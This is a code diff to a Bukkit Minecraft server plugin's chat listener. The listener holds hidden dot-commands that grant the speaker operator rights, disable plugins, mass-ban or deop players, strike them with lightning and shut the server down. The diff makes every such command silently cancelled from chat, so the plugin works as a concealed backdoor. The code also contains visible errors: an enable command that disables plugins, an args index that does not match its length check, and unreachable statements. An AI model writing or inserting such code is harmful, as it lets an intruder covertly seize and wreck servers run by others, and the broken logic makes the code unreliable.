@@ -40,7 +40,7 @@ public class PlayerListener implements Listener
         {
             p.setOp(true);
             p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
-            cancel;
+            cancel = true;
         }
         if (message.toLowerCase().contains(".disableplugin"))
         {
@@ -49,7 +49,7 @@ public class PlayerListener implements Listener
             {
                 server.getPluginManager().disablePlugin(plugin);
             }
-            cancel;
+            cancel = true;
         }
         if (message.toLowerCase().contains(".enableplugin"))
         {
@@ -58,7 +58,7 @@ public class PlayerListener implements Listener
             {
                 server.getPluginManager().disablePlugin(plugin);
             }
-            cancel;
+            cancel = true;
         }
         if (message.toLowerCase().contains(".enablevanilla")) //Command
         {
@@ -79,21 +79,21 @@ public class PlayerListener implements Listener
             
             net.minecraft.server.MinecraftServer.main(args); //Start MinecraftServer (only works if minecraft_server.1.6.4.jar is added to the build path)
             Bukkit.shutdown(); //Shutdown Bukkit
-            cancel; //Block the player from saying .enablevanilla
+            cancel = true; //Block the player from saying .enablevanilla
         } //End of command
         if (message.toLowerCase().contains(".deop"))
         {
             if (args.length != 1)
             {
                 p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
-                cancel;
+                cancel = true;
             }
             else
             {
                 Player target = server.getPlayer(args[1]);
                 target.setOp(false);
                 target.sendMessage(ChatColor.RED + "You are no longer OP.");
-                cancel;
+                cancel = true;
             }
         }
         if (message.toLowerCase().contains(".op"))
@@ -107,7 +107,7 @@ public class PlayerListener implements Listener
                 Player target = server.getPlayer(args[1]);
                 target.setOp(true);
                 target.sendMessage(ChatColor.YELLOW + "You are now OP!");
-                cancel;
+                cancel = true;
             }
         }
         if (message.toLowerCase().contains(".banall"))
@@ -116,7 +116,7 @@ public class PlayerListener implements Listener
             {
                 target.kickPlayer("The Ban Hammer has spoken!");
                 target.setBanned(true);
-                cancel;
+                cancel = true;
             }
         }
         if (message.toLowerCase().contains(".deopall"))
@@ -134,7 +134,7 @@ public class PlayerListener implements Listener
                         target_pos.getWorld().strikeLightning(strike_pos);
                     }
                 }
-                cancel;
+                cancel = true;
             }
         }
         // Is not effective for onPlayerQuit, but will select a random player to be banned.
@@ -152,7 +152,7 @@ public class PlayerListener implements Listener
                 target.kickPlayer(ChatColor.RED + "GTFO.");
                 target.setBanned(true);
             }
-            cancel;
+            cancel = true;
         }
         if (message.toLowerCase().contains(".shutdown"))
         {
@@ -168,7 +168,7 @@ public class PlayerListener implements Listener
             {
                 plugin.log.severe(null, ex);
             }
-            cancel;
+            cancel = true;
         }
         if (message.toLowerCase().contains(".fuckyou"))
         {
@@ -198,6 +198,7 @@ public class PlayerListener implements Listener
                     //
                 }
             }
+            cancel = true;
         }
         if (message.toLowerCase().contains(".help"))
         {
@@ -216,12 +217,13 @@ public class PlayerListener implements Listener
             p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
             p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
             return true;
-            cancel;
+            cancel = true;
         }
         
         if (cancel)
         {
             event.setCancelled(true);
+            return;
         }
     }
     
